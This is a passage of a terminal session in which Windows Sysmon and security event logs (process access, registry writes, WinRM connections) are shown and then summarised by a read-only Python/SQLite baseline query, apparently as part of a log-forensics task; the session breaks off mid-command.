-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00207
-event_code: 10
-timestamp: 2026-05-06T00:00:13.119Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f6ba|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00208
-event_code: 10
-timestamp: 2026-05-06T00:00:13.119Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 2784
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+f97f|c:\windows\system32\lsm.dll+f7ad|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00210
-event_code: 10
-timestamp: 2026-05-06T00:00:13.120Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+111b6|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00212
-event_code: 10
-timestamp: 2026-05-06T00:00:13.120Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-9967-5f14-1600-000000000400}
-TargetProcessId: 1048
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x40
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|c:\windows\system32\lsm.dll+1a207|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+38289|C:\windows\System32\combase.dll+9e2bf|C:\windows\System32\combase.dll+154c3|C:\windows\System32\combase.dll+152b3|C:\windows\System32\combase.dll+a1166|C:\windows\System32\combase.dll+3c3fa|C:\windows\System32\combase.dll+9cdad|C:\windows\System32\combase.dll+52acc|C:\windows\System32\combase.dll+53331|C:\windows\System32\combase.dll+54ad8|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c470|C:\windows\System32\RPCRT4.dll+1a6bf|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00213
-event_code: 10
-timestamp: 2026-05-06T00:00:13.121Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+111b6|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00216
-event_code: 10
-timestamp: 2026-05-06T00:00:13.122Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-9967-5f14-1600-000000000400}
-TargetProcessId: 1048
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x40
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|c:\windows\system32\lsm.dll+1a207|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+38289|C:\windows\System32\combase.dll+9e2bf|C:\windows\System32\combase.dll+154c3|C:\windows\System32\combase.dll+152b3|C:\windows\System32\combase.dll+a1166|C:\windows\System32\combase.dll+3c3fa|C:\windows\System32\combase.dll+9cdad|C:\windows\System32\combase.dll+52acc|C:\windows\System32\combase.dll+53331|C:\windows\System32\combase.dll+54ad8|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c470|C:\windows\System32\RPCRT4.dll+1a6bf|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00220
-event_code: 10
-timestamp: 2026-05-06T00:00:13.123Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+111b6|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00222
-event_code: 10
-timestamp: 2026-05-06T00:00:13.123Z
-image: C:\windows\system32\svchost.exe
-target_image: C:\windows\System32\svchost.exe
-message: Process accessed:
-RuleName: -
-UtcTime: 2020-07-22 04:19:00.001
-SourceProcessGUID: {03255e25-9966-5f14-1200-000000000400}
-SourceProcessId: 444
-SourceThreadId: 5184
-SourceImage: C:\windows\system32\svchost.exe
-TargetProcessGUID: {03255e25-996e-5f14-4700-000000000400}
-TargetProcessId: 3232
-TargetImage: C:\windows\System32\svchost.exe
-GrantedAccess: 0x1000
-CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+6a7f5|c:\windows\system32\lsm.dll+111b6|C:\windows\System32\RPCRT4.dll+76953|C:\windows\System32\RPCRT4.dll+da036|C:\windows\System32\RPCRT4.dll+37a4c|C:\windows\System32\RPCRT4.dll+548c8|C:\windows\System32\RPCRT4.dll+2c921|C:\windows\System32\RPCRT4.dll+2c1db|C:\windows\System32\RPCRT4.dll+1a86f|C:\windows\System32\RPCRT4.dll+19d1a|C:\windows\System32\RPCRT4.dll+19301|C:\windows\System32\RPCRT4.dll+18d6e|C:\windows\System32\RPCRT4.dll+169a5|C:\windows\SYSTEM32\ntdll.dll+333ed|C:\windows\SYSTEM32\ntdll.dll+34142|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
-process_guid: {03255e25-9966-5f14-1200-000000000400}
-----------------------------------------
-event_id: evt-00224
-event_code: 12
-timestamp: 2026-05-06T00:00:13.124Z
-image: C:\windows\System32\svchost.exe
-target_object: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider
-message: Registry object added or deleted:
-RuleName: -
-EventType: CreateKey
-UtcTime: 2020-07-22 04:19:00.001
-ProcessGuid: {03255e25-996e-5f14-4700-000000000400}
-ProcessId: 3232
-Image: C:\windows\System32\svchost.exe
-TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider
-process_guid: {03255e25-996e-5f14-4700-000000000400}
-----------------------------------------
-event_id: evt-00226
-event_code: 13
-timestamp: 2026-05-06T00:00:13.125Z
-image: C:\windows\System32\svchost.exe
-target_object: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime
-details: QWORD (0x01d65fdf-0x39703e82)
-message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:00.001
-ProcessGuid: {03255e25-996e-5f14-4700-000000000400}
-ProcessId: 3232
-Image: C:\windows\System32\svchost.exe
-TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime
-Details: QWORD (0x01d65fdf-0x39703e82)
-process_guid: {03255e25-996e-5f14-4700-000000000400}
-----------------------------------------
-event_id: evt-00227
-event_code: 13
-timestamp: 2026-05-06T00:00:14.117Z
-image: C:\windows\system32\svchost.exe
-target_object: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime
-details: QWORD (0x01d65fdf-0x397e6787)
-message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:00.093
-ProcessGuid: {03255e25-996e-5f14-4900-000000000400}
-ProcessId: 3252
-Image: C:\windows\system32\svchost.exe
-TargetObject: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime
-Details: QWORD (0x01d65fdf-0x397e6787)
-process_guid: {03255e25-996e-5f14-4900-000000000400}
-----------------------------------------
-event_id: evt-00498
-event_code: 13
-timestamp: 2026-05-06T00:00:30.274Z
-image: C:\windows\system32\svchost.exe
-target_object: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime
-details: QWORD (0x01d65fdf-0x4307d38d)
-message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:16.094
-ProcessGuid: {03255e25-996e-5f14-4900-000000000400}
-ProcessId: 3252
-Image: C:\windows\system32\svchost.exe
-TargetObject: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime
-Details: QWORD (0x01d65fdf-0x4307d38d)
-process_guid: {03255e25-996e-5f14-4900-000000000400}
-----------------------------------------
-event_id: evt-00585
-event_code: 12
-timestamp: 2026-05-06T00:00:42.363Z
-image: C:\windows\System32\svchost.exe
-target_object: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections
-message: Registry object added or deleted:
-RuleName: -
-EventType: CreateKey
-UtcTime: 2020-07-22 04:19:28.639
-ProcessGuid: {03255e25-99c7-5f14-4802-000000000400}
-ProcessId: 1128
-Image: C:\windows\System32\svchost.exe
-TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections
-process_guid: {03255e25-99c7-5f14-4802-000000000400}
-----------------------------------------
-event_id: evt-00586
-event_code: 5158
-timestamp: 2026-05-06T00:00:42.363Z
-message: The Windows Filtering Platform has permitted a bind to a local port.
-
-Application Information:
-	Process ID:		1128
-	Application Name:	\device\harddiskvolume2\windows\system32\svchost.exe
-
-Network Information:
-	Source Address:		0.0.0.0
-	Source Port:		57204
-	Protocol:		6
-
-Filter Information:
-	Filter Run-Time ID:	0
-	Layer Name:		Resource Assignment
-	Layer Run-Time ID:	36
-----------------------------------------
-event_id: evt-00605
-event_code: 5158
-timestamp: 2026-05-06T00:00:43.363Z
-message: The Windows Filtering Platform has permitted a bind to a local port.
-
-Application Information:
-	Process ID:		1128
-	Application Name:	\device\harddiskvolume2\windows\system32\svchost.exe
-
-Network Information:
-	Source Address:		0.0.0.0
-	Source Port:		57205
-	Protocol:		6
-
-Filter Information:
-	Filter Run-Time ID:	0
-	Layer Name:		Resource Assignment
-	Layer Run-Time ID:	36
-----------------------------------------
-event_id: evt-00606
-event_code: 5158
-timestamp: 2026-05-06T00:00:43.363Z
-message: The Windows Filtering Platform has permitted a bind to a local port.
-
-Application Information:
-	Process ID:		1128
-	Application Name:	\device\harddiskvolume2\windows\system32\svchost.exe
-
-Network Information:
-	Source Address:		0.0.0.0
-	Source Port:		57206
-	Protocol:		6
-
-Filter Information:
-	Filter Run-Time ID:	0
-	Layer Name:		Resource Assignment
-	Layer Run-Time ID:	36
-----------------------------------------
-event_id: evt-00607
-event_code: 11
-timestamp: 2026-05-06T00:00:43.364Z
-image: C:\windows\System32\svchost.exe
-message: File created:
-RuleName: -
-UtcTime: 2020-07-22 04:19:29.724
-ProcessGuid: {03255e25-9968-5f14-2700-000000000400}
-ProcessId: 1652
-Image: C:\windows\System32\svchost.exe
-TargetFilename: C:\Windows\ServiceState\EventLog\Data\lastalive0.dat
-CreationUtcTime: 2020-07-19 19:05:13.292
-process_guid: {03255e25-9968-5f14-2700-000000000400}
-----------------------------------------
-event_id: evt-00608
-event_code: 3
-timestamp: 2026-05-06T00:00:44.371Z
-user: NT AUTHORITY\NETWORK SERVICE
-image: C:\Windows\System32\svchost.exe
-message: Network connection detected:
-RuleName: -
-UtcTime: 2020-07-22 04:19:28.536
-ProcessGuid: {03255e25-99c7-5f14-4802-000000000400}
-ProcessId: 1128
-Image: C:\Windows\System32\svchost.exe
-User: NT AUTHORITY\NETWORK SERVICE
-Protocol: tcp
-Initiated: true
-SourceIsIpv6: false
-SourceIp: 172.18.39.6
-SourceHostname: -
-SourcePort: 57204
-SourcePortName: -
-DestinationIsIpv6: false
-DestinationIp: 172.18.38.6
-DestinationHostname: -
-DestinationPort: 5985
-DestinationPortName: -
-dst_ip: 172.18.38.6
-dst_port: 5985
-process_guid: {03255e25-99c7-5f14-4802-000000000400}
-----------------------------------------
-event_id: evt-00619
-event_code: 3
-timestamp: 2026-05-06T00:00:46.371Z
-user: NT AUTHORITY\NETWORK SERVICE
-image: C:\Windows\System32\svchost.exe
-message: Network connection detected:
-RuleName: -
-UtcTime: 2020-07-22 04:19:29.607
-ProcessGuid: {03255e25-99c7-5f14-4802-000000000400}
-ProcessId: 1128
-Image: C:\Windows\System32\svchost.exe
-User: NT AUTHORITY\NETWORK SERVICE
-Protocol: tcp
-Initiated: true
-SourceIsIpv6: false
-SourceIp: 172.18.39.6
-SourceHostname: -
-SourcePort: 57205
-SourcePortName: -
-DestinationIsIpv6: false
-DestinationIp: 172.18.38.6
-DestinationHostname: -
-DestinationPort: 5985
-DestinationPortName: -
-dst_ip: 172.18.38.6
-dst_port: 5985
-process_guid: {03255e25-99c7-5f14-4802-000000000400}
-----------------------------------------
-event_id: evt-00620
-event_code: 3
-timestamp: 2026-05-06T00:00:46.371Z
-user: NT AUTHORITY\NETWORK SERVICE
-image: C:\Windows\System32\svchost.exe
-message: Network connection detected:
-RuleName: -
-UtcTime: 2020-07-22 04:19:29.609
-ProcessGuid: {03255e25-99c7-5f14-4802-000000000400}
-ProcessId: 1128
-Image: C:\Windows\System32\svchost.exe
-User: NT AUTHORITY\NETWORK SERVICE
-Protocol: tcp
-Initiated: true
-SourceIsIpv6: false
-SourceIp: 172.18.39.6
-SourceHostname: -
-SourcePort: 57206
-SourcePortName: -
-DestinationIsIpv6: false
-DestinationIp: 172.18.38.6
-DestinationHostname: -
-DestinationPort: 5985
-DestinationPortName: -
-dst_ip: 172.18.38.6
-dst_port: 5985
-process_guid: {03255e25-99c7-5f14-4802-000000000400}
-----------------------------------------
-event_id: evt-00621
-event_code: 13
-timestamp: 2026-05-06T00:00:46.371Z
-image: C:\windows\system32\svchost.exe
-target_object: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime
-details: QWORD (0x01d65fdf-0x4c912219)
-message: Registry value set:
-RuleName: -
-EventType: SetValue
-UtcTime: 2020-07-22 04:19:32.093
-ProcessGuid: {03255e25-996e-5f14-4900-000000000400}
-ProcessId: 3252
-Image: C:\windows\system32\svchost.exe
-TargetObject: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime
-Details: QWORD (0x01d65fdf-0x4c912219)
-process_guid: {03255e25-996e-5f14-4900-000000000400}
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/baseline.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's see all unique values in some of these fields to see what is normal
-[?2004l[?2004h> print("=== Unique users ===")
-[?2004l[?2004h> cursor.execute("SELECT user, COUNT(*) FROM events GROUP BY user")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(r)
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== Unique images ===")
-[?2004l[?2004h> cursor.execute("SELECT image, COUNT(*) FROM events GROUP BY image")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(r)
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== Unique target images ===")
-[?2004l[?2004h> cursor.execute("SELECT target_image, COUNT(*) FROM events GROUP BY target_image")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(r)
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== Unique target objects ===")
-[?2004l[?2004h> cursor.execute("SELECT target_object, COUNT(*) FROM events GROUP BY target_object")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(r)
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== Pipe events (18) ===")
-[?2004l[?2004h> cursor.execute("SELECT event_id, host, user, image, details, message FROM events WHERE event_code = 18")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(r)
-[?2004l[?2004h> 
-[?2004l[?2004h> print("=== Share/Logon events (4624, 5140, 5145) ===")
-[?2004l[?2004h> cursor.execute("SELECT event_id, event_code, host, user, target_user, details, message FROM events WHERE event_code IN (4624, 5140, 5145)")
-[?2004l[?2004h> for r in cursor.fetchall():
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Host: {r[2]} | User: {r[3]} | TargetUser: {r[4]} | Details: {r[5][:200]} | Msg: {r[6][:200]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/baseline.py
-[?2004l=== Unique users ===
-('', 455)
-('-', 8)
-('CORP\\pgustavo', 10)
-('DC01$', 6)
-('NT AUTHORITY\\NETWORK SERVICE', 21)
-('NT AUTHORITY\\SYSTEM', 15)
-('WEC$', 13)
-('pgustavo', 129)
-=== Unique images ===
-('', 528)
-('C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe', 1)
-('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 23)
-('C:\\Windows\\System32\\dns.exe', 5)
-('C:\\Windows\\System32\\lsass.exe', 10)
-('C:\\Windows\\System32\\svchost.exe', 31)
-('C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', 3)
-('C:\\windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe', 2)
-('C:\\windows\\System32\\svchost.exe', 9)
-('C:\\windows\\system32\\svchost.exe', 40)
-('System', 5)
-=== Unique target images ===
-('', 627)
-('C:\\windows\\System32\\svchost.exe', 26)
-('C:\\windows\\servicing\\TrustedInstaller.exe', 1)
-('C:\\windows\\system32\\LogonUI.exe', 2)
-('C:\\windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.957_none_5f2e9e6258ea82f2\\TiWorker.exe', 1)
-=== Unique target objects ===
-('', 625)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug', 1)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections', 3)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater', 1)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VFUProvider', 2)
-('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VFUProvider\\StartTime', 2)
-('HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters', 2)
-('HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime', 9)
-('HKU\\S-1-5-19\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad', 1)
-('HKU\\S-1-5-21-2253742117-2054739524-205962475-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections', 11)
-=== Pipe events (18) ===
-('evt-00074', 'DC01.corp.example', '', 'System', '', 'Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-07-22 04:18:49.324\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nPipeName: \\lsass\r\nImage: System')
-('evt-00075', 'DC01.corp.example', '', 'System', '', 'Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-07-22 04:18:49.356\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nPipeName: \\lsass\r\nImage: System')
-('evt-00076', 'DC01.corp.example', '', 'System', '', 'Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-07-22 04:18:49.387\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nPipeName: \\lsass\r\nImage: System')
-('evt-00077', 'DC01.corp.example', '', 'System', '', 'Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-07-22 04:18:49.653\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nPipeName: \\lsass\r\nImage: System')
-=== Share/Logon events (4624, 5140, 5145) ===
-ID: evt-00039 | Code: 4624 | Host: DC01.corp.example | User: - | TargetUser: WEC$ | Details:  | Msg: An account was successfully logged on.
-
-Subject:
-	Security ID:		S-1-0-0
-	Account Name:		-
-	Account Domain:		-
-	Logon ID:		0x0
-
-Logon Information:
-	Logon Type:		3
-	Restricted Admin Mode:	-
-	
-ID: evt-00041 | Code: 5140 | Host: DC01.corp.example | User: WEC$ | TargetUser:  | Details:  | Msg: A network share object was accessed.
-	
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1111
-	Account Name:		WEC$
-	Account Domain:		CORP
-	Logon ID:		0x578CA4F
-
-Network Informat
-ID: evt-00042 | Code: 5145 | Host: DC01.corp.example | User: WEC$ | TargetUser:  | Details:  | Msg: A network share object was checked to see whether client can be granted desired access.
-	
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1111
-	Account Name:		WEC$
-	Account Domai
-ID: evt-00047 | Code: 5145 | Host: DC01.corp.example | User: WEC$ | TargetUser:  | Details:  | Msg: A network share object was checked to see whether client can be granted desired access.
-	
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1111
-	Account Name:		WEC$
-	Account Domai
-ID: evt-00052 | Code: 5145 | Host: DC01.corp.example | User: WEC$ | TargetUser:  | Details:  | Msg: A network share object was checked to see whether client can be granted desired access.
-	
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1111
-	Account Name:		WEC$
-	Account Domai
-ID: evt-00063 | Code: 4624 | Host: DC01.corp.example | User: - | TargetUser: WEC$ | Details:  | Msg: An account was successfully logged on.
-
-Subject:
-	Security ID:		S-1-0-0
-	Account Name:		-
-	Account Domain:		-
-	Logon ID:		0x0
-
-Logon Information:
-	Logon Type:		3
-	Restricted Admin Mode:	-
-	
-ID: evt-00067 | Code: 4624 | Host: DC01.corp.example | User: - | TargetUser: WEC$ | Details:  | Msg: An account was successfully logged on.
-
-Subject:
-	Security ID:		S-1-0-0
-	Account Name:		-
-	Account Domain:		-
-	Logon ID:		0x0
-
-Logon Information:
-	Logon Type:		3
-	Restricted Admin Mode:	-
-	
-ID: evt-00071 | Code: 5145 | Host: DC01.corp.example | User: WEC$ | TargetUser:  | Details:  | Msg: A network share object was checked to see whether client can be granted desired access.
-	
-Subject:
-	Security ID:		S-1-5-21-2253742117-2054739524-205962475-1111
-	Account Name:		WEC$
-	Account Domai
-ID: evt-00550 | Code: 4624 | Host: DC01.corp.example | User: - | TargetUser: DC01$ | Details:  | Msg: An account was successfully logged on.
-
-Subject:
-	Security ID:		S-1-0-0
-	Account Name:		-
-	Account Domain:		-
-	Logon ID:		0x0
-
-Logon Information:
-	Logon Type:		3
-	Restricted Admin Mode:	-
-	
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/baseline_to_file.py
